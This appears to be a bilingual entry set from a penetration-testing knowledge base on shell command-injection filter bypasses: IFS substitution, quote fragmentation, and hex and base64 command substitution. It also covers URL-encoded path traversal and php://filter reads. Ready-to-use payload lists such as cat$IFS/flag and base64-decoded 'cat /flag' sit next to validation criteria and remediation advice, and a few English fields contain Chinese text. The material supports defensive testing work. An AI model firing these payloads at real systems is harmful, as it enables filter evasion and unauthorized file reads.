title.en: Validation step 1 for Shell IFS Whitespace-Substitution Injection

execution.command:
whoami
who$IFSami
wh$oa$mi
w$h$o$a$m$i
who${IFS}ami
who${IFS:- }ami
who$IFS$IFSami
cat$IFS/flag
cat${IFS}/flag
cat${IFS:- }/flag
cat$IFS$IFS/flag
ls$IFS/
ls${IFS}/
ls${IFS:- }/
id$IFS
id${IFS}
id${IFS:- }
uname$IFS-a
uname${IFS}-a
uname${IFS:- }-a
pwd$IFS
pwd${IFS}
pwd${IFS:- }
hostname$IFS
hostname${IFS}
hostname${IFS:- }

description.zh: $IFS 绕过包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Shell IFS Whitespace-Substitution Injection validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 只有进程 argv、xtrace 或等价审计显示 $IFS 展开成独立参数并触发预期无害动作才为阳性。过滤器放行 `$IFS`、Shell 打印变量文本、或未定义变量导致空串均不能单独证明绕过。
analysis.en: A finding requires argv, xtrace, or equivalent audit showing IFS expansion into separate arguments and the intended harmless action. A filter allowing `$IFS`, the shell printing it literally, or an undefined variable becoming empty does not prove bypass.

opsecTips.zh: 一旦确认字段分割形成预期两个参数即停止，禁止继续读取 `/flag` 或遍历根目录样例。
opsecTips.en: Stop as soon as field splitting into the expected two arguments is confirmed; do not continue with `/flag` reads or root-directory listing samples.

opsecTips.zh: 测试完成后恢复环境变量基线，删除临时标记并确认 Shell 环境未被持久修改。
opsecTips.en: Restore the environment-variable baseline after testing, remove temporary markers, and verify that the shell environment was not persistently modified.

title.zh: 确认IFS 参数边界绕过适用边界
title.en: Confirm the IFS Argument-Boundary Bypass boundary

description.zh: 条目包含 whoami、cat、ls 等命令的 IFS 变体，只有在 POSIX/Bash 类 Shell 展开环境变量时才适用。 记录正常输入、执行主体、组件版本和相关进程、文件或网络日志基线。
description.en: Contains IFS variants of commands such as whoami, cat, and ls and applies only when a POSIX-like or Bash shell expands variables. Record normal input, the execution principal, component version, and relevant process, file, or network-log baseline.

title.zh: 提交受控IFS 参数边界绕过样例
title.en: Submit a controlled IFS Argument-Boundary Bypass case

description.zh: 确认实际 Shell 和 IFS 值，使用一个固定标记文件或 echo 参数比较普通空格、$IFS 与未定义变量三组请求。 一次只验证一种机制，并以唯一无害标记替代真实敏感读取、系统修改或无边界扫描。
description.en: Confirm the shell and IFS value, then compare ordinary space, $IFS, and an undefined-variable control using a fixed marker file or echo argument. Validate one mechanism at a time and use a unique harmless marker instead of sensitive reads, system changes, or unbounded scanning.

attackChain.payload:
whoami
who$IFSami
wh$oa$mi
w$h$o$a$m$i
who${IFS}ami
who${IFS:- }ami
who$IFS$IFSami
cat$IFS/flag
cat${IFS}/flag
cat${IFS:- }/flag
cat$IFS$IFS/flag
ls$IFS/
ls${IFS}/
ls${IFS:- }/
id$IFS
id${IFS}
id${IFS:- }
uname$IFS-a
uname${IFS}-a
uname${IFS:- }-a
pwd$IFS
pwd${IFS}
pwd${IFS:- }
hostname$IFS
hostname${IFS}
hostname${IFS:- }

title.zh: 核对IFS 参数边界绕过证据

description.zh: 进程 argv 或 Shell 执行跟踪必须显示 IFS 展开后形成了独立参数；原字符串被接受或页面报错不构成绕过。 对齐各层时间戳并排除输入回显、缓存、统一错误、网络抖动和测试工具自身行为。
description.en: Process argv or shell tracing must show separate arguments after IFS expansion; accepting the raw string or returning an error is not bypass. Align timestamps across layers and exclude reflection, caching, generic errors, network jitter, and behavior caused by the test tool itself.

title.zh: 修复并回归IFS 参数边界绕过
title.en: Remediate and regress IFS Argument-Boundary Bypass

description.zh: 移除 Shell 调用并传递结构化 argv；若无法移除，固定环境、清空不需要变量并对每个参数做允许列表验证。 重放相同三组基线，合法路径应保持可用，异常输入不得再改变执行、文件访问或最终连接目标。
description.en: Remove shell invocation and pass structured argv; if unavoidable, fix the environment, clear unneeded variables, and allowlist each argument. Replay the same three baselines; valid paths should remain functional and anomalous input must no longer alter execution, file access, or final destinations.

overview.zh: Shell IFS 空白替代注入用于条目包含 whoami、cat、ls 等命令的 IFS 变体，只有在 POSIX/Bash 类 Shell 展开环境变量时才适用。 审校时先确认执行主体、解析器、平台和授权测试对象，并保留未修改请求或命令作为正常基线。
overview.en: Shell IFS Whitespace-Substitution Injection is intended for this boundary: Contains IFS variants of commands such as whoami, cat, and ls and applies only when a POSIX-like or Bash shell expands variables. Confirm the execution principal, parser, platform, and authorized test object, and retain an unmodified baseline.

vulnerability.zh: 应用依赖空格黑名单但仍将输入交给 Shell，IFS 展开在过滤后重新产生字段分隔，恢复命令和参数边界。 结论必须落到实际信任边界，不能把字符串外观、工具输出或中间层状态变化直接当成漏洞。
vulnerability.en: The application blocks spaces but still delegates to a shell, where IFS expansion recreates field separators after filtering. The conclusion must identify the real trust boundary rather than treating string appearance, tool output, or intermediary status changes as a vulnerability.

exploitation.zh: 确认实际 Shell 和 IFS 值，使用一个固定标记文件或 echo 参数比较普通空格、$IFS 与未定义变量三组请求。 进程 argv 或 Shell 执行跟踪必须显示 IFS 展开后形成了独立参数；原字符串被接受或页面报错不构成绕过。 全程关联原始输入、规范化结果、进程或网络日志和最终业务影响，形成可重复的阳性与阴性证据。
exploitation.en: Confirm the shell and IFS value, then compare ordinary space, $IFS, and an undefined-variable control using a fixed marker file or echo argument. Process argv or shell tracing must show separate arguments after IFS expansion; accepting the raw string or returning an error is not bypass. Correlate raw input, canonicalized values, process or network logs, and final business impact to build repeatable positive and negative evidence.

mitigation.zh: 移除 Shell 调用并传递结构化 argv；若无法移除，固定环境、清空不需要变量并对每个参数做允许列表验证。 修复后用同一正常、阳性和阴性样例回归，确认合法功能保留，原先跨越解释器、文件或网络边界的差异消失。
mitigation.en: Remove shell invocation and pass structured argv; if unavoidable, fix the environment, clear unneeded variables, and allowlist each argument. After remediation, replay the same normal, positive, and negative cases to preserve valid behavior and remove the former interpreter, file, or network-boundary difference.

name.zh: Shell 引号令牌拆分注入

description.zh: 在命令名中插入单引号或双引号，验证 Shell 拼接令牌与关键词过滤器之间的语义差异。
description.en: Inserts single or double quotes into command names to test semantic differences between shell token concatenation and keyword filters.

prerequisites.zh: 已识别目标为会连接相邻引用片段的 Unix Shell，并排除 Windows CMD、PowerShell 和直接 exec 调用。
prerequisites.en: Identify a Unix shell that concatenates adjacent quoted fragments and exclude Windows CMD, PowerShell, and direct exec invocation.

prerequisites.zh: 在隔离目录提供唯一的无害测试可执行文件，避免引用重组后命中真实系统命令。
prerequisites.en: Provide a unique harmless test executable in an isolated directory so quote reassembly cannot invoke a real system command.

title.zh: 引号绕过
title.en: Validation step 1 for Shell Quote-Based Token Fragmentation

execution.command:
w'h'o'am'i
w"h"o"am"i
w'h'o'a'm'i
w"h"o"a"m"i
c'a't /flag
c"a"t /flag
c'a't$IFS/flag
c"a"t$IFS/flag
c'a't${IFS}/flag
c"a"t${IFS}/flag
l's' /
l"s" /
i'd'
i"d"
u'n'a'm'e -a
u"n"a"m"e -a
p'w'd
p"w"d
h'o's't'n'a'm'e
h"o"s"t"n"a"m"e

description.zh: 引号绕过包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Shell Quote-Based Token Fragmentation validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性要求引号片段在 Shell 词法阶段重组为同一个测试命令名，并在进程映像中可见。未闭合引号错误、过滤规则不告警、或字符串在响应中去掉引号都是假阳性。
analysis.en: Positive evidence requires quoted fragments to reassemble into one test command token visible in the process image. Unclosed-quote errors, a silent filter, or quotes disappearing only in reflected output are false positives.

opsecTips.zh: 测试命令被成功重组一次后停止，不切换到 `cat`、`uname` 等会暴露主机信息的原始行。
opsecTips.en: Stop after one successful test-command reassembly and do not switch to original `cat` or `uname` lines that expose host data.

opsecTips.zh: 移除隔离目录中的测试可执行文件和 PATH 临时变更，并复核没有名称碰撞残留。
opsecTips.en: Remove the test executable and any temporary PATH changes, then verify that no command-name collision remains.

title.zh: 确认引号令牌重组适用边界
title.en: Confirm the Quote-Based Token Reassembly boundary

description.zh: 这些变体依赖 Shell 将相邻引用片段连接为同一单词，不适用于直接 execve 参数或 Windows CMD。 记录正常输入、执行主体、组件版本和相关进程、文件或网络日志基线。
description.en: These variants rely on a shell concatenating adjacent quoted fragments into one word and do not apply to direct execve arguments or Windows CMD. Record normal input, the execution principal, component version, and relevant process, file, or network-log baseline.

title.zh: 提交受控引号令牌重组样例
title.en: Submit a controlled Quote-Based Token Reassembly case

description.zh: 先确认输入经过哪种 Shell，再用无害自定义命令名或固定 echo 标记比较完整单词、引号拆分和未闭合引号。 一次只验证一种机制，并以唯一无害标记替代真实敏感读取、系统修改或无边界扫描。
description.en: Identify the shell, then compare a complete harmless command name, a quote-fragmented form, and an unclosed-quote control using a fixed echo marker. Validate one mechanism at a time and use a unique harmless marker instead of sensitive reads, system changes, or unbounded scanning.

attackChain.payload:
w'h'o'am'i
w"h"o"am"i
w'h'o'a'm'i
w"h"o"a"m"i
c'a't /flag
c"a"t /flag
c'a't$IFS/flag
c"a"t$IFS/flag
c'a't${IFS}/flag
c"a"t${IFS}/flag
l's' /
l"s" /

u"n"a"m"e -a

p"w"d

h"o"s"t"n"a"m"e

title.zh: 核对引号令牌重组证据

description.zh: Shell 跟踪或进程映像必须显示拆分文本被重组为同一可执行文件；语法错误变化或 WAF 放行不算成功。 对齐各层时间戳并排除输入回显、缓存、统一错误、网络抖动和测试工具自身行为。
description.en: Shell tracing or the process image must show fragmented text reassembled into the same executable; changed syntax errors or WAF passage are insufficient. Align timestamps across layers and exclude reflection, caching, generic errors, network jitter, and behavior caused by the test tool itself.

title.zh: 修复并回归引号令牌重组
title.en: Remediate and regress Quote-Based Token Reassembly

description.zh: 禁止拼接 Shell 命令，使用固定可执行文件和 argv；不要以关键词黑名单或引号删除代替结构化调用。 重放相同三组基线，合法路径应保持可用，异常输入不得再改变执行、文件访问或最终连接目标。
description.en: Do not concatenate shell commands; use a fixed executable and argv, and never substitute keyword blacklists or quote removal for structured invocation. Replay the same three baselines; valid paths should remain functional and anomalous input must no longer alter execution, file access, or final destinations.

overview.zh: Shell 引号令牌拆分注入用于这些变体依赖 Shell 将相邻引用片段连接为同一单词，不适用于直接 execve 参数或 Windows CMD。 审校时先确认执行主体、解析器、平台和授权测试对象，并保留未修改请求或命令作为正常基线。
overview.en: Shell Quote-Based Token Fragmentation is intended for this boundary: These variants rely on a shell concatenating adjacent quoted fragments into one word and do not apply to direct execve arguments or Windows CMD. Confirm the execution principal, parser, platform, and authorized test object, and retain an unmodified baseline.

vulnerability.zh: 过滤器按原始文本匹配完整命令名，而 Shell 删除引用语法后重组令牌，导致被拆开的关键词恢复。 结论必须落到实际信任边界，不能把字符串外观、工具输出或中间层状态变化直接当成漏洞。
vulnerability.en: A filter matches complete command names in raw text while the shell removes quote syntax and reassembles the token, restoring the blocked word. The conclusion must identify the real trust boundary rather than treating string appearance, tool output, or intermediary status changes as a vulnerability.

exploitation.zh: 先确认输入经过哪种 Shell，再用无害自定义命令名或固定 echo 标记比较完整单词、引号拆分和未闭合引号。 Shell 跟踪或进程映像必须显示拆分文本被重组为同一可执行文件；语法错误变化或 WAF 放行不算成功。 全程关联原始输入、规范化结果、进程或网络日志和最终业务影响，形成可重复的阳性与阴性证据。
exploitation.en: Identify the shell, then compare a complete harmless command name, a quote-fragmented form, and an unclosed-quote control using a fixed echo marker. Shell tracing or the process image must show fragmented text reassembled into the same executable; changed syntax errors or WAF passage are insufficient. Correlate raw input, canonicalized values, process or network logs, and final business impact to build repeatable positive and negative evidence.

mitigation.zh: 禁止拼接 Shell 命令，使用固定可执行文件和 argv；不要以关键词黑名单或引号删除代替结构化调用。 修复后用同一正常、阳性和阴性样例回归，确认合法功能保留，原先跨越解释器、文件或网络边界的差异消失。
mitigation.en: Do not concatenate shell commands; use a fixed executable and argv, and never substitute keyword blacklists or quote removal for structured invocation. After remediation, replay the same normal, positive, and negative cases to preserve valid behavior and remove the former interpreter, file, or network-boundary difference.

name.zh: printf 十六进制命令替换注入

description.zh: 通过 printf 解码十六进制字节，再由 $() 或反引号执行结果，验证编码内容能否跨越命令边界。
description.en: Decodes hexadecimal bytes with printf and executes the result through $() or backticks to test whether encoded content crosses the command boundary.

subCategory.zh: 十六进制解码与命令替换

prerequisites.zh: 目标 Shell 同时支持 printf 十六进制转义与 `$()` 或反引号命令替换。
prerequisites.en: The target shell supports both printf hexadecimal escapes and command substitution through `$()` or backticks.

prerequisites.zh: 已将编码正文替换为仅输出唯一令牌的命令，并启用能观察解码器与第二阶段进程的审计。
prerequisites.en: Replace encoded content with a command that emits only a unique token and enable auditing of both decoder and second-stage processes.

title.zh: 编码绕过 (Hex)
title.en: Validation step 1 for printf Hex-Decoding Command Substitution

description.zh: 编码绕过 (Hex)包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this printf Hex-Decoding Command Substitution validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性链应依次出现 printf 解码和解码结果对应的标记进程；仅看到十六进制转为明文、命令替换返回空值、或应用回显明文都不代表执行。
analysis.en: A positive chain shows printf decoding followed by the marker process represented by the decoded text. Hexadecimal text becoming plaintext, command substitution returning empty output, or application reflection does not demonstrate execution.

opsecTips.zh: 确认一次二阶段标记执行后立即停止，禁止解码原集合中的文件读取或主机枚举命令。
opsecTips.en: Stop immediately after one second-stage marker execution; do not decode the source file-read or host-enumeration commands.

opsecTips.zh: 删除标记产物与 Shell 历史中的测试字符串，确认没有反引号子进程或临时脚本残留。
opsecTips.en: Delete marker artifacts and test strings from shell history, and confirm that no backtick child process or temporary script remains.

title.zh: 确认十六进制解码与命令替换适用边界
title.en: Confirm the Hex Decoding and Command Substitution boundary

description.zh: 集合同时覆盖单引号、双引号及两种命令替换语法，适用于支持 printf 转义与命令替换的 Unix Shell。 记录正常输入、执行主体、组件版本和相关进程、文件或网络日志基线。
description.en: Covers single and double quotes plus two command-substitution forms in Unix shells that support printf escapes and substitution. Record normal input, the execution principal, component version, and relevant process, file, or network-log baseline.

title.zh: 提交受控十六进制解码与命令替换样例
title.en: Submit a controlled Hex Decoding and Command Substitution case

description.zh: 将编码内容替换为只输出固定标记的无害命令，分别比较单引号、双引号、$() 和反引号，不读取真实文件。 一次只验证一种机制，并以唯一无害标记替代真实敏感读取、系统修改或无边界扫描。
description.en: Replace encoded content with a harmless fixed-marker command and compare quoting and substitution forms without reading real files. Validate one mechanism at a time and use a unique harmless marker instead of sensitive reads, system changes, or unbounded scanning.

title.zh: 核对十六进制解码与命令替换证据
title.en: Verify Hex Decoding and Command Substitution evidence

description.zh: 审计需同时显示 printf 子进程及其解码后命令，且固定标记来自第二阶段执行；解码文本回显本身不足。 对齐各层时间戳并排除输入回显、缓存、统一错误、网络抖动和测试工具自身行为。
description.en: Audit must show both the printf process and decoded command, with the fixed marker produced by second-stage execution; decoded reflection alone is insufficient. Align timestamps across layers and exclude reflection, caching, generic errors, network jitter, and behavior caused by the test tool itself.

title.zh: 修复并回归十六进制解码与命令替换
title.en: Remediate and regress Hex Decoding and Command Substitution

description.zh: 移除 Shell 和动态命令替换，允许的业务动作映射到固定函数；对编码输入解码一次后按数据类型验证。 重放相同三组基线，合法路径应保持可用，异常输入不得再改变执行、文件访问或最终连接目标。
description.en: Remove shell and dynamic substitution, map allowed actions to fixed functions, and decode encoded input once before type validation. Replay the same three baselines; valid paths should remain functional and anomalous input must no longer alter execution, file access, or final destinations.

overview.zh: printf 十六进制命令替换注入用于集合同时覆盖单引号、双引号及两种命令替换语法，适用于支持 printf 转义与命令替换的 Unix Shell。 审校时先确认执行主体、解析器、平台和授权测试对象，并保留未修改请求或命令作为正常基线。
overview.en: printf Hex-Decoding Command Substitution is intended for this boundary: Covers single and double quotes plus two command-substitution forms in Unix shells that support printf escapes and substitution. Confirm the execution principal, parser, platform, and authorized test object, and retain an unmodified baseline.

vulnerability.zh: 防护只检查明文命令，但 Shell 先运行 printf 产生新字符串，再把输出当作命令替换执行，形成二阶段解释。 结论必须落到实际信任边界，不能把字符串外观、工具输出或中间层状态变化直接当成漏洞。
vulnerability.en: A control checks plaintext commands while the shell first runs printf to produce a new string and then executes the output through command substitution. The conclusion must identify the real trust boundary rather than treating string appearance, tool output, or intermediary status changes as a vulnerability.

exploitation.zh: 将编码内容替换为只输出固定标记的无害命令，分别比较单引号、双引号、$() 和反引号，不读取真实文件。 审计需同时显示 printf 子进程及其解码后命令，且固定标记来自第二阶段执行；解码文本回显本身不足。 全程关联原始输入、规范化结果、进程或网络日志和最终业务影响，形成可重复的阳性与阴性证据。
exploitation.en: Replace encoded content with a harmless fixed-marker command and compare quoting and substitution forms without reading real files. Audit must show both the printf process and decoded command, with the fixed marker produced by second-stage execution; decoded reflection alone is insufficient. Correlate raw input, canonicalized values, process or network logs, and final business impact to build repeatable positive and negative evidence.

mitigation.zh: 移除 Shell 和动态命令替换，允许的业务动作映射到固定函数；对编码输入解码一次后按数据类型验证。 修复后用同一正常、阳性和阴性样例回归，确认合法功能保留，原先跨越解释器、文件或网络边界的差异消失。
mitigation.en: Remove shell and dynamic substitution, map allowed actions to fixed functions, and decode encoded input once before type validation. After remediation, replay the same normal, positive, and negative cases to preserve valid behavior and remove the former interpreter, file, or network-boundary difference.

name.zh: Base64 解码命令替换注入

description.zh: 将 Base64 文本解码后交给 $() 或反引号执行，验证明文黑名单是否被二阶段解析绕过。
description.en: Decodes Base64 text and executes it through $() or backticks to test whether two-stage parsing bypasses plaintext filtering.

prerequisites.zh: 目标环境存在兼容的 Base64 解码器，且应用确实把解码输出送入 Shell 命令替换。
prerequisites.en: A compatible Base64 decoder exists and the application actually sends decoded output into shell command substitution.

prerequisites.zh: 使用编码后的固定 echo 令牌，同时保留只解码不执行和非法编码两个对照。
prerequisites.en: Use an encoded fixed echo token and retain decode-only and invalid-encoding controls.

title.zh: 编码绕过 (Base64)
title.en: Validation step 1 for Base64-Decoded Command Substitution

execution.command:
$(echo Y2F0IC9mbGFn|base64 -d)
$(echo aWQ=|base64 -d)
$(echo d2hvYW1p|base64 -d)
$(echo bHMgLw==|base64 -d)
$(echo cHdk|base64 -d)
$(echo dW5hbWUgLWE=|base64 -d)
$(echo aG9zdG5hbWU=|base64 -d)
`echo Y2F0IC9mbGFn|base64 -d`
`echo aWQ=|base64 -d`
`echo d2hvYW1p|base64 -d`
`echo bHMgLw==|base64 -d`
`echo cHdk|base64 -d`
`echo dW5hbWUgLWE=|base64 -d`
`echo aG9zdG5hbWU=|base64 -d`
$(echo$IFS Y2F0IC9mbGFn|base64$IFS -d)

description.zh: 编码绕过 (Base64)包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Base64-Decoded Command Substitution validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性必须出现解码进程之后的独立标记命令，且只解码对照不会创建该进程。Base64 字符串被接受、明文出现在响应、或解码器退出码为零均属于假阳性边界。
analysis.en: Positive evidence requires an independent marker command after the decoder while the decode-only control creates no such process. Accepted Base64, reflected plaintext, or a zero decoder exit status are false-positive boundaries.

opsecTips.zh: 一旦验证解码结果被执行就停止，不使用原始编码内容访问文件系统或执行身份命令。
opsecTips.en: Stop as soon as decoded output execution is proven; do not use source encodings to access files or run identity commands.

opsecTips.zh: 清除测试令牌、命令历史与解码缓存，并检查没有临时脚本或管道进程继续运行。
opsecTips.en: Clear test tokens, command history, and decoder caches, and verify that no temporary script or pipeline process remains.

title.zh: 确认Base64 解码与命令替换适用边界
title.en: Confirm the Base64 Decoding and Command Substitution boundary

description.zh: 这些样例依赖 base64 工具、Shell 管道与命令替换，需区分仅解码输出和真正执行解码结果。 记录正常输入、执行主体、组件版本和相关进程、文件或网络日志基线。
description.en: These samples depend on a base64 utility, shell pipelines, and command substitution, and require distinguishing decoded output from actual execution. Record normal input, the execution principal, component version, and relevant process, file, or network-log baseline.

title.zh: 提交受控Base64 解码与命令替换样例
title.en: Submit a controlled Base64 Decoding and Command Substitution case

description.zh: 用编码后的固定 echo 标记替代文件读取，分别测试只解码、命令替换和未完成编码负对照，并记录进程树。 一次只验证一种机制，并以唯一无害标记替代真实敏感读取、系统修改或无边界扫描。
description.en: Use an encoded fixed echo marker instead of file access, compare decode-only, command-substitution, and invalid-encoding controls, and record the process tree. Validate one mechanism at a time and use a unique harmless marker instead of sensitive reads, system changes, or unbounded scanning.

attackChain.payload:
$(echo Y2F0IC9mbGFn|base64 -d)
$(echo aWQ=|base64 -d)
$(echo d2hvYW1p|base64 -d)
$(echo bHMgLw==|base64 -d)
$(echo cHdk|base64 -d)
$(echo dW5hbWUgLWE=|base64 -d)
$(echo aG9zdG5hbWU=|base64 -d)
`echo Y2F0IC9mbGFn|base64 -d`
`echo aWQ=|base64 -d`
`echo d2hvYW1p|base64 -d`
`echo bHMgLw==|base64 -d`
`echo cHdk|base64 -d`
`echo dW5hbWUgLWE=|base64 -d`
`echo aG9zdG5hbWU=|base64 -d`
$(echo$IFS Y2F0IC9mbGFn|base64$IFS -d)
`echo$IFS Y2F0IC9mbGFn|base64$IFS -d`
$(echo${IFS}Y2F0IC9mbGFn|base64${IFS}-d)
`echo${IFS}Y2F0IC9mbGFn|base64${IFS}-d`

title.zh: 核对Base64 解码与命令替换证据
title.en: Verify Base64 Decoding and Command Substitution evidence

description.zh: 成功要求解码工具之后产生独立命令进程和固定标记；仅显示解码字符串、退出码变化或 WAF 放行不成立。 对齐各层时间戳并排除输入回显、缓存、统一错误、网络抖动和测试工具自身行为。
description.en: Success requires a separate command process and fixed marker after the decoder; displaying decoded text, changing an exit code, or passing the WAF is insufficient. Align timestamps across layers and exclude reflection, caching, generic errors, network jitter, and behavior caused by the test tool itself.

title.zh: 修复并回归Base64 解码与命令替换
title.en: Remediate and regress Base64 Decoding and Command Substitution

description.zh: 业务代码不得把解码结果送入 Shell；Base64 仅作为数据格式，解码后执行严格类型校验并使用固定程序 argv。 重放相同三组基线，合法路径应保持可用，异常输入不得再改变执行、文件访问或最终连接目标。
description.en: Never pass decoded content to a shell; treat Base64 only as a data format, validate the decoded type, and invoke a fixed program with argv. Replay the same three baselines; valid paths should remain functional and anomalous input must no longer alter execution, file access, or final destinations.

overview.zh: Base64 解码命令替换注入用于这些样例依赖 base64 工具、Shell 管道与命令替换，需区分仅解码输出和真正执行解码结果。 审校时先确认执行主体、解析器、平台和授权测试对象，并保留未修改请求或命令作为正常基线。
overview.en: Base64-Decoded Command Substitution is intended for this boundary: These samples depend on a base64 utility, shell pipelines, and command substitution, and require distinguishing decoded output from actual execution. Confirm the execution principal, parser, platform, and authorized test object, and retain an unmodified baseline.

vulnerability.zh: 过滤在解码前检查输入，而后端 Shell 解码后再次解释结果；明文关键字因此直到防护之后才出现。 结论必须落到实际信任边界，不能把字符串外观、工具输出或中间层状态变化直接当成漏洞。
vulnerability.en: Filtering occurs before decoding while the backend shell interprets the decoded result, causing blocked plaintext to appear only after inspection. The conclusion must identify the real trust boundary rather than treating string appearance, tool output, or intermediary status changes as a vulnerability.

exploitation.zh: 用编码后的固定 echo 标记替代文件读取，分别测试只解码、命令替换和未完成编码负对照，并记录进程树。 成功要求解码工具之后产生独立命令进程和固定标记；仅显示解码字符串、退出码变化或 WAF 放行不成立。 全程关联原始输入、规范化结果、进程或网络日志和最终业务影响，形成可重复的阳性与阴性证据。
exploitation.en: Use an encoded fixed echo marker instead of file access, compare decode-only, command-substitution, and invalid-encoding controls, and record the process tree. Success requires a separate command process and fixed marker after the decoder; displaying decoded text, changing an exit code, or passing the WAF is insufficient. Correlate raw input, canonicalized values, process or network logs, and final business impact to build repeatable positive and negative evidence.

mitigation.zh: 业务代码不得把解码结果送入 Shell；Base64 仅作为数据格式，解码后执行严格类型校验并使用固定程序 argv。 修复后用同一正常、阳性和阴性样例回归，确认合法功能保留，原先跨越解释器、文件或网络边界的差异消失。
mitigation.en: Never pass decoded content to a shell; treat Base64 only as a data format, validate the decoded type, and invoke a fixed program with argv. After remediation, replay the same normal, positive, and negative cases to preserve valid behavior and remove the former interpreter, file, or network-boundary difference.

name.zh: URL 编码路径穿越变体

description.zh: 使用单层、双层、反斜杠、过长 UTF-8 与控制字节编码测试路径规范化和根目录限制。
description.en: Uses single and double encoding, backslashes, overlong UTF-8, and control-byte variants to test path canonicalization and root enforcement.

prerequisites.zh: 已定位到文件读取、下载或路径拼接参数，而不是 URL 跳转或 Shell 命令参数。
prerequisites.en: Locate a file-read, download, or path-construction parameter rather than a redirect or shell-command argument.

prerequisites.zh: 允许目录外放置一个无敏感信息的标记文件，并能查看规范化后的绝对路径和文件访问审计。
prerequisites.en: Place a nonsensitive marker outside the allowed directory and observe the canonical absolute path and file-access audit.

title.zh: URL编码穿越
title.en: Validation step 1 for URL-Encoded Path Traversal Variants

description.zh: URL编码穿越包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this URL-Encoded Path Traversal Variants validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性是后端文件 API 打开了允许根之外的标记文件，且路径审计与响应令牌一致。路径出现在错误页、服务器返回 400/500、或代理仅做一次解码但未发生文件访问都是假阳性。
analysis.en: Positive evidence is the backend file API opening the marker outside the allowed root with matching path audit and response token. Paths in error pages, 400 or 500 responses, or one proxy decode without a file open are false positives.

opsecTips.zh: 首个越界标记被读取后停止，不继续尝试系统配置、日志、凭据或设备文件。
opsecTips.en: Stop after the first out-of-root marker read and do not proceed to configuration, logs, credentials, or device files.

opsecTips.zh: 删除标记文件，清理下载缓存和临时规范化日志，并确认测试路径未进入持久任务。
opsecTips.en: Delete the marker, clear download caches and temporary canonicalization logs, and ensure the test path did not enter a persistent job.

title.zh: 确认路径规范化绕过适用边界
title.en: Confirm the Path Canonicalization Bypass boundary

description.zh: 原名称误称命令穿越，实际全部是 ../ 或反斜杠的编码路径片段，应在文件读取或下载参数中测试。 记录正常输入、执行主体、组件版本和相关进程、文件或网络日志基线。
description.en: The source was mislabeled as command traversal; every line is an encoded ../ or backslash path fragment for file-read or download parameters. Record normal input, the execution principal, component version, and relevant process, file, or network-log baseline.

title.zh: 提交受控路径规范化绕过样例
title.en: Submit a controlled Path Canonicalization Bypass case

description.zh: 使用允许目录外的无敏感标记文件，逐个测试一种编码并记录各层解码值、最终绝对路径和文件访问审计。 一次只验证一种机制，并以唯一无害标记替代真实敏感读取、系统修改或无边界扫描。
description.en: Use a nonsensitive marker outside the allowed directory, test one encoding at a time, and record each decoded value, final absolute path, and file audit. Validate one mechanism at a time and use a unique harmless marker instead of sensitive reads, system changes, or unbounded scanning.

title.zh: 核对路径规范化绕过证据

description.zh: 必须证明应用实际打开根目录外标记；错误页中的路径、回显的 ../ 或统一拒绝响应都不算文件读取。 对齐各层时间戳并排除输入回显、缓存、统一错误、网络抖动和测试工具自身行为。
description.en: The application must actually open the out-of-root marker; a path in an error page, reflected ../ text, or uniform denial is not a file read. Align timestamps across layers and exclude reflection, caching, generic errors, network jitter, and behavior caused by the test tool itself.

title.zh: 修复并回归路径规范化绕过
title.en: Remediate and regress Path Canonicalization Bypass

description.zh: 规范化一次后验证最终绝对路径位于固定根下，拒绝绝对路径、反斜杠和非法编码，并用服务端对象 ID 映射。 重放相同三组基线，合法路径应保持可用，异常输入不得再改变执行、文件访问或最终连接目标。
description.en: 规范化一次后验证最终绝对路径位于固定根下，拒绝绝对路径、反斜杠和非法编码，并用服务端对象 ID 映射。 重放相同三组基线，合法路径应保持可用，异常输入不得再改变执行、文件访问或最终连接目标。

overview.zh: URL 编码路径穿越变体用于原名称误称命令穿越，实际全部是 ../ 或反斜杠的编码路径片段，应在文件读取或下载参数中测试。 审校时先确认执行主体、解析器、平台和授权测试对象，并保留未修改请求或命令作为正常基线。
overview.en: URL-Encoded Path Traversal Variants is intended for this boundary: The source was mislabeled as command traversal; every line is an encoded ../ or backslash path fragment for file-read or download parameters. Confirm the execution principal, parser, platform, and authorized test object, and retain an unmodified baseline.

vulnerability.zh: 代理、框架和文件 API 解码次数或分隔符规则不同，校验前后的规范路径不一致时可逃离允许根目录。 结论必须落到实际信任边界，不能把字符串外观、工具输出或中间层状态变化直接当成漏洞。
vulnerability.en: Proxies, frameworks, and file APIs may differ in decoding count or separators, allowing input to escape the allowed root when validation and canonical paths differ. The conclusion must identify the real trust boundary rather than treating string appearance, tool output, or intermediary status changes as a vulnerability.

exploitation.zh: 使用允许目录外的无敏感标记文件，逐个测试一种编码并记录各层解码值、最终绝对路径和文件访问审计。 必须证明应用实际打开根目录外标记；错误页中的路径、回显的 ../ 或统一拒绝响应都不算文件读取。 全程关联原始输入、规范化结果、进程或网络日志和最终业务影响，形成可重复的阳性与阴性证据。
exploitation.en: Use a nonsensitive marker outside the allowed directory, test one encoding at a time, and record each decoded value, final absolute path, and file audit. The application must actually open the out-of-root marker; a path in an error page, reflected ../ text, or uniform denial is not a file read. Correlate raw input, canonicalized values, process or network logs, and final business impact to build repeatable positive and negative evidence.

mitigation.zh: 规范化一次后验证最终绝对路径位于固定根下，拒绝绝对路径、反斜杠和非法编码，并用服务端对象 ID 映射。 修复后用同一正常、阳性和阴性样例回归，确认合法功能保留，原先跨越解释器、文件或网络边界的差异消失。
mitigation.en: 规范化一次后验证最终绝对路径位于固定根下，拒绝绝对路径、反斜杠和非法编码，并用服务端对象 ID 映射。 修复后用同一正常、阳性和阴性样例回归，确认合法功能保留，原先跨越解释器、文件或网络边界的差异消失。

name.zh: PHP Filter Wrapper 源码读取

description.zh: 使用 php://filter 的 Base64 转换与 resource 参数验证文件读取/包含入口是否可返回 PHP 源码或测试文件内容。
description.en: Uses php://filter Base64 conversion and resource parameters to test whether a read or include sink can return PHP source or test-file content.

